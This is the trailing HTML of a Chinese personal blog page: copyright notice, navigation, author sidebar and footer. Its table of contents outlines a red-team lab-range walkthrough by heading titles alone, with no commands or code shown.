+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Bamboo22</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/">http://example.com/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Bamboo22 's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://api.bimg.cc/random" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二"><img class="cover" src="https://api.bimg.cc/random" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">红日靶场二</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="内网横向移动"><img class="cover" src="https://api.bimg.cc/random" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">内网横向移动</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">Bamboo22</div><div class="author-info__description">热爱学习，分享技术</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bamb0022"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到Bamboo的博客！原博客已于2024年1月22日完成迁移，将会持续更新</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#win7"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">win7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#win2003"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">win2003</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#win2008"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">win2008</span></a></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#01-ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80"><span class="toc-number">2.</span> <span class="toc-text">01 ATT&amp;CK红队评估一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.0.1.</span> <span class="toc-text">一、信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E9%9D%B6%E6%9C%BAIP"><span class="toc-number">2.0.1.1.</span> <span class="toc-text">探测靶机IP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.0.1.2.</span> <span class="toc-text">探测开放端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web%E7%AB%AF%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.0.1.3.</span> <span class="toc-text">web端信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.0.1.4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#phpmyadmin%E5%86%99%F0%9F%90%8E"><span class="toc-number">2.0.1.4.1.</span> <span class="toc-text">phpmyadmin写🐎</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#yxcms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.0.1.4.2.</span> <span class="toc-text">yxcms文件上传</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#yxcms-xss"><span class="toc-number">2.0.1.4.3.</span> <span class="toc-text">yxcms xss</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">2.0.2.</span> <span class="toc-text">三、后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-msf%E4%B8%8A%E7%BA%BF"><span class="toc-number">2.0.2.1.</span> <span class="toc-text">1. msf上线</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-msf%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.0.2.2.</span> <span class="toc-text">2.msf信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%8F%90%E6%9D%83"><span class="toc-number">2.0.2.3.</span> <span class="toc-text">3.提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%8A%93%E5%8F%96%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF"><span class="toc-number">2.0.2.4.</span> <span class="toc-text">4.抓取域用户的密码信息</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AF%BC%E5%85%A5%E8%B4%A6%E5%8F%B7%E3%80%81%E5%AF%86%E7%A0%81hash%E5%80%BC"><span class="toc-number">2.0.2.4.1.</span> <span class="toc-text">1.导入账号、密码hash值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-mimikatz"><span class="toc-number">2.0.2.4.2.</span> <span class="toc-text">2.mimikatz</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-kiwi"><span class="toc-number">2.0.2.4.3.</span> <span class="toc-text">3.kiwi</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3389%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.0.2.5.</span> <span class="toc-text">5.3389连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E8%B7%A8%E7%BD%91%E6%AE%B5%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.0.2.6.</span> <span class="toc-text">6.跨网段横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#6-1-msf-socks4a-proxychains-%E7%A9%BF%E9%80%8F%E5%86%85%E7%BD%91"><span class="toc-number">2.0.2.6.1.</span> <span class="toc-text">6.1 msf socks4a proxychains 穿透内网</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-2%E6%B5%8B%E8%AF%95%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F"><span class="toc-number">2.0.2.6.2.</span> <span class="toc-text">6.2测试是否成功</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-3%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.0.2.6.3.</span> <span class="toc-text">6.3内网信息搜集</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-4%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BB"><span class="toc-number">2.0.2.6.4.</span> <span class="toc-text">6.4永恒之蓝攻击</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-MSF%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BBPTH"><span class="toc-number">2.0.2.7.</span> <span class="toc-text">7.MSF哈希传递攻击PTH</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-CS%E4%B8%8A%E7%BA%BF"><span class="toc-number">2.0.2.8.</span> <span class="toc-text">8.CS上线</span></a></li></ol></li></ol></li></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/DC4%20&amp;%20DC5/" title="DC4 &amp; DC5"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC4 &amp; DC5"></a><div class="content"><a class="title" href="/2024/01/23/DC4%20&amp;%20DC5/" title="DC4 &amp; DC5">DC4 &amp; DC5</a><time datetime="2024-01-23T09:30:58.103Z" title="发表于 2024-01-23 17:30:58">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网信息搜集"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网信息搜集"></a><div class="content"><a class="title" href="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网信息搜集">内网信息搜集</a><time datetime="2024-01-23T09:30:12.000Z" title="发表于 2024-01-23 17:30:12">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/DC2%20&amp;%20DC3/" title="DC1 &amp; DC3"><img src="/DC2%20&amp;%20DC3/image-20230717104511424.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC1 &amp; DC3"></a><div class="content"><a class="title" href="/2024/01/23/DC2%20&amp;%20DC3/" title="DC1 &amp; DC3">DC1 &amp; DC3</a><time datetime="2024-01-23T09:28:25.268Z" title="发表于 2024-01-23 17:28:25">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场四"></a><div class="content"><a class="title" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四">红日靶场四</a><time datetime="2024-01-23T09:25:42.516Z" title="发表于 2024-01-23 17:25:42">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场二"></a><div class="content"><a class="title" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二">红日靶场二</a><time datetime="2024-01-23T09:22:35.758Z" title="发表于 2024-01-23 17:22:35">2024-01-23</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2024 By Bamboo22</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
